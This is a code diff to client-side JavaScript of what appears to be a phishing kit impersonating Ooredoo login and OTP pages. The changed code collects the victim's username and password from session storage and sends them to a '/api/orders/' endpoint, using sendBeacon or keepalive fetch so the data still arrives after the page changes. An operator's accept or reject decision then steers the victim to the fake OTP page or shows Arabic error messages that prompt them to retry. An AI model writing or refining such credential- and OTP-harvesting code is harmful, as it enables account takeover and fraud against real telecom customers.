@@ -90,30 +90,58 @@
 
   function checkDecision() {
     const decision = getFlowDecision();
+    const flow = sessionStorage.getItem('ooredooFlow') || 'login';
     const orderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
 
     if (decision === 'accept') {
+      if (flow === 'otp') {
+        localStorage.removeItem('ooredooDecision');
+        sessionStorage.removeItem('ooredooDecision');
+        sessionStorage.setItem('ooredooFlow', 'otp');
+        window.location.href = 'success.html';
+        return;
+      }
+
       const payload = {
         ooredooUser: sessionStorage.getItem('ooredooUser') || '',
         ooredooPass: sessionStorage.getItem('ooredooPass') || '',
         status: 'pending'
       };
 
-      fetch('/api/orders/' + encodeURIComponent(orderId), {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(() => {});
+      const body = JSON.stringify(payload);
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon('/api/orders/' + encodeURIComponent(orderId), new Blob([body], { type: 'application/json' }));
+      } else {
+        fetch('/api/orders/' + encodeURIComponent(orderId), {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: body,
+          keepalive: true
+        }).catch(() => {});
+      }
 
       sessionStorage.setItem('loginError', 'تم قبول الطلب. يرجى متابعة التحقق من الرمز.');
+      localStorage.removeItem('ooredooDecision');
+      sessionStorage.removeItem('ooredooDecision');
+      sessionStorage.setItem('ooredooFlow', 'otp');
       window.location.href = 'otp_ooredoo.html';
       return;
     }
 
     if (decision === 'reject') {
+      if (flow === 'otp') {
+        sessionStorage.setItem('otpError', 'الرمز غير صحيح أو غير صالح');
+        localStorage.removeItem('ooredooDecision');
+        sessionStorage.removeItem('ooredooDecision');
+        sessionStorage.setItem('ooredooFlow', 'otp');
+        window.location.href = 'otp_ooredoo.html';
+        return;
+      }
+
       sessionStorage.setItem('loginError', 'اسم المستخدم أو كلمة المرور غير صحيح');
       localStorage.removeItem('ooredooDecision');
       sessionStorage.removeItem('ooredooDecision');
+      sessionStorage.setItem('ooredooFlow', 'login');
       window.location.href = 'login_ooredoo.html';
       return;
     }
